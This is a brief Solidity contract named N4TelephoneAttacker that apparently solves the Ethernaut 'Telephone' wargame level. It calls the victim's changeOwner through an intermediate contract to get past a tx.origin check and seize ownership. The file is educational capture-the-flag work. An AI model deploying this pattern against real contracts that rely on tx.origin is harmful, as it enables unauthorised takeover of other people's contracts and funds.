//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "../levels/Telephone.sol";

contract N4TelephoneAttacker {
    address public owner;
    Telephone public victim;

    constructor(address _victim) {
        owner = msg.sender;
        victim = Telephone(_victim);
    }

    function attack() public {
        victim.changeOwner(owner);
    }
}